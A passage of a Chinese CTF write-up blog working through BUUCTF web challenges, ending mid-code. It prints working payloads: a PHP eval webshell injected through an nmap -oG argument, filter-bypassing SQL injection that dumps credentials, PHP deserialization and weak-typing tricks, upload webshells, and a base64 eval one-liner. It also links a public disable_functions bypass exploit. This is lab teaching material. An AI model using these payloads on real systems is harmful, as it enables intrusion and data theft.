+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-oG test.php    //将扫描结果写入test.php</span><br></pre></td></tr></table></figure>
+<p>由以上两点可构造payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=<span class="string">' &lt;?php @eval($_POST["pass"]); ?&gt; -oG test.php '</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/OnlineTool/onlineTool0.jpg" alt=""><br>拿到目录，去访问一下test.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/OnlineTool/onlineTool1.jpg" alt=""><br>蚁剑直接连，里面发现flag文件</p>
+<h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc0.jpg" alt=""><br>查看源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc1.jpg" alt=""><br>看来需要绕WAF，源码中发现了calc.php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'num'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">'num'</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\'</span><span class="string">', '</span><span class="string">"', '`', '\[', '\]','\$','\\','\^'];</span></span><br><span class="line"><span class="string">        foreach (<span class="variable">$blacklist</span> as <span class="variable">$blackitem</span>) </span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">                if (preg_match('/' . <span class="variable">$blackitem</span> . '/m', <span class="variable">$str</span>)) </span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                        die("</span>what are you want to <span class="keyword">do</span>?<span class="string">");</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        eval('echo '.<span class="variable">$str</span>.';');</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>看到eval函数，就知道是RCE了<br>这里需要传入num参数，且对num参数进行了过滤<br>第一步绕过WAF,这里利用的是PHP的解析规则，即php从请求的url中取出变量时，如果变量前面有空格，会去掉前面的空格再解析<br>这里WAF只对’num’进行了过滤，如果是’ num’WAF就失效了，当php解析时’ num’就会被处理成’num’.<br>接下来就是扫一下目录，但是过滤了’/‘,可用chr()来代替</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=123;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc2.jpg" alt=""><br>读取文件内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=123;var_dump(file_get_contents(chr(47).f1agg))</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/EasyCalc/calc3.jpg" alt=""></p>
+<h3 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag0.jpg" alt=""><br>查看源码<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag1.jpg" alt=""><br>这里要求参数password不能为数字，同时还要满足password==404，弱类型比较.money还要大于100000000</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=404abc&amp;money=100000001</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag2.jpg" alt=""><br>啥也没有，会发现Cookie的值有问题，修改成1<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag3.jpg" alt=""><br>money的值太长了，这里可以利用科学计数法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=404abc&amp;money=2e8</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/buyflag/buyflag4.jpg" alt=""></p>
+<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql1.jpg" alt=""><br>万能密码登陆成功<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql2.jpg" alt=""><br>在username处有注入点，是单字符注入，爆字段数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%27 order by 1%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql0.jpg" alt=""><br>发现对or、by进行了过滤，双写绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=admin%27 oorrder bbyy 1%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql3.jpg" alt=""><br>成功绕过，爆出字段数为3，测试注入点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1%27 union select 1,2,3%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql4.jpg" alt=""><br>发现对union、select进行了过滤，双写绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,2,3%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql5.jpg" alt=""><br>注入点为2，3,爆库名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),version()%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql6.jpg" alt=""><br>当前数据库为geek,爆表名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(schema_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">"geek"</span>%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p>发现from、information、where也被过滤了，依然用双写绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(table_name) ffromrom infoorrmation_schema.tables wwherehere table_schema=<span class="string">"geek"</span>%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql7.jpg" alt=""><br>得到表名为b4bsql、geekuser，爆字段</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(column_name) ffromrom infoorrmation_schema.columns wwherehere table_name=<span class="string">"b4bsql"</span>%23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql8.jpg" alt=""><br>两个表的字段一样，接下来就是找flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(username,0x3a,password) ffromrom b4bsql %23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p>测试发现password被过滤，这里字段password中有or子字符串，双写绕过就行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=1%27 uunionnion sselectelect 1,database(),group_concat(username,0x3a,passwoorrd) ffromrom b4bsql %23&amp;password=123</span><br></pre></td></tr></table></figure>
+<p>在b4bsql表中找到flag<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BabySQL/babysql9.jpg" alt=""></p>
+<h3 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">"flag.php"</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    protected <span class="variable">$op</span>;</span><br><span class="line">    protected <span class="variable">$filename</span>;</span><br><span class="line">    protected <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() &#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">"1"</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">process</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable">$this</span>-&gt;<span class="built_in">read</span>();</span><br><span class="line">            <span class="variable">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">write</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;filename) &amp;&amp; isset(<span class="variable">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="variable">$this</span>-&gt;content) &gt; 100) &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                die();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">read</span></span>() &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> output(<span class="variable">$s</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="variable">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> is_valid(<span class="variable">$s</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= 32 &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= 125))</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line">    <span class="variable">$str</span> = (string)<span class="variable">$_GET</span>[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>目的是要读取出flag.php中的内容<br>有read和write方法，在read方法中，会读取出filename中的内容，显然我们是要想办法调用read方法<br>在construct方法中，调用了process方法，进入process方法，可以看见如果op==”2”就会去调用read方法，但是在destruct方法中会判断op===”2”,如果成立就会替换为op=”1”,继续调用process时就不能调用read方法了,很明显在destruct中是强类型比较，在process中是弱类型比较，只要使op=2即可绕过destruct方法<br>还有一个函数is_valid,判断是不是可见字符，因为题目中类的成员是protected<br>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上 \0*\0 的前缀，这里的 \0 表示 ASCII 码为 0 的字符，也就是我们经过 urlencode 后看到的 %00 ，所以这无法通过is_valid的过滤<br>这里只需要把protected改为public即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FileHandler &#123;</span><br><span class="line">    public <span class="variable">$op</span> = 2;</span><br><span class="line">    public <span class="variable">$filename</span> = <span class="string">"flag.php"</span>;</span><br><span class="line">    public <span class="variable">$content</span> = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=new FileHandler();</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=O:11:<span class="string">"FileHandler"</span>:3:&#123;s:2:<span class="string">"op"</span>;i:2;s:8:<span class="string">"filename"</span>;s:8:<span class="string">"flag.php"</span>;s:7:<span class="string">"content"</span>;s:0:<span class="string">""</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>在源码中就能发现flag</p>
+<h3 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h3><p>尝试上传包含<?php @eval($_POST["shell"]);?>的php文件，失败。修改后缀还是不行，burp抓包，修改一下MIME类型image/jpeg，还是不行，继续换后缀，发现phtml时返回了新信息<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Upload/upload0.jpg" alt=""><br>说明对文件内容进行了过滤，那就不能用php标签了，换成js<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/Upload/upload1.jpg" alt=""><br>上传成功，蚁剑getshell<br>连上后在文件里发现php7、phps等后缀文件均可getshell,师傅们太强了<br>文件太多，不一一寻找flag,直接终端cat /flag</p>
+<h3 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h3><p>直接用上一个题的imageUpload.phtml文件上传，成功上传，返回了路径，直接getshell<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/ACTF_Upload/upload_0.jpg" alt=""></p>
+<h3 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h3><p>提示说cve-2020-7066，另一篇文章讲了该漏洞<a href="https://zxfireworks.xyz/2020/07/07/CVE-2020-7066/" target="_blank" rel="noopener">https://zxfireworks.xyz/2020/07/07/CVE-2020-7066/</a><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_0.jpg" alt=""><br>点进去后，URL很特别，其他啥也没有<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_1.jpg" alt=""><br>用bp抓一下包<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_2.jpg" alt=""><br>提示使用localhost,刚开始还以为是修改X-Forwarded-For呢,测试了一下并不是，那就应该是修改URL中那个特别的参数<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_3.jpg" alt=""><br>又出现了新提示，Host必须以123结尾，将刚才的url=<a href="http://127.0.0.1修改为url=http://127.0.0.123,并没有什么反应" target="_blank" rel="noopener">http://127.0.0.1修改为url=http://127.0.0.123,并没有什么反应</a><br>文章开头说了，这个题目给了提示，而且在页面中有句话：You just view *.ctfhub.com<br>那是不是要求URL解析后只能为127.0.0.123，且还要get传参中的url是.ctfhub.com结尾，那这就可以利用该漏洞了<br>Payload:?url=<a href="http://127.0.0.123%00www.ctfhub.com">http://127.0.0.123%00www.ctfhub.com</a><br>这里没用\0是因为这是已经解析过了的<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/CVE-2020-7066/cve20207066_4.jpg" alt=""></p>
+<h3 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ClassName</span><br><span class="line">&#123;</span><br><span class="line">        public <span class="variable">$code</span> = null;</span><br><span class="line">        public <span class="variable">$decode</span> = null;</span><br><span class="line">        <span class="keyword">function</span> __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;code = @<span class="variable">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="variable">$this</span>-&gt;decode = @base64_decode( <span class="variable">$this</span>-&gt;code );</span><br><span class="line">                @Eval(<span class="variable">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line">        public <span class="keyword">function</span> x()</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$_REQUEST</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">new ClassName();</span><br></pre></td></tr></table></figure>
+<p>第一眼看到以为是反序列化，结果没看到unserialize<br>__construct()函数中，code的值是调用x()函数，而x()函数可以请求一个参数Ginkgo,得到的参数在经过base解码后作为Eval()函数的参数执行了，Eval显然可以利用命令执行，尝试传入一个一句话木马(eval($_POST[“pass”]);)试试，不过这里要先base64编码<br>payload:?Ginkgo=ZXZhbCgkX1BPU1RbInBhc3MiXSk7<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_0.jpg" alt=""><br>用蚁剑连接成功，flag文件打开啥也没有，readflag文件是一堆乱码<br>去看了大佬的wp,说是利用PHP7.3版本的一个漏洞bypass disable_functions，该漏洞利用PHP garbage collector程序中的堆溢出触发命令执行，可影响linux,php7.0-7.3<br>大佬的exp:<a href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank" rel="noopener">https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php</a><br>下载后修改一下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_1.jpg" alt=""><br>在蚁剑里可以发现只有tmp文件夹是有权限写入的，将exp放到tmp里面，上传exp后利用最开始的命令执行来包含exp(include(“/tmp/exploit.php”);)<br>Payload:?Ginkgo=aW5jbHVkZSgiL3RtcC9leHBsb2l0LnBocCIpOw==<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/GKCTF2020_CheckIN/checkin_2.jpg" alt=""></p>
+<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/easy_web/easyweb0.jpg" alt=""><br>查看源码，没啥东西，就只有一张图片的base64编码形式。URL中img参数的值很像是base64编码，试着解码,可以解码，解码后的内容还是base64，继续</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TXpVek5UTTFNbVUzTURabE5qYz0</span><br><span class="line">MzUzNTM1MmU3MDZlNjc=</span><br><span class="line">3535352e706e67</span><br></pre></td></tr></table></figure>
+<p>这串数字是16进制，尝试转换一下，转出来是555.png<br>不难想到，img这个参数是不是可以将指定文件的内容输出出来。尝试输出一下index.php，不过要把index.php先转换为16进制，再进行两次base64编码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">696E6465782E706870</span><br><span class="line">Njk2RTY0NjU3ODJFNzA2ODcw</span><br><span class="line">TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</span><br></pre></td></tr></table></figure>
+<p>Payload:?img=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3&amp;cmd=<br>结果在原来图片的位置返回了index.php的base64编码，解码后如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_GET</span>[<span class="string">'img'</span>]) || !isset(<span class="variable">$_GET</span>[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    die(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . <span class="variable">$txt</span> . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span 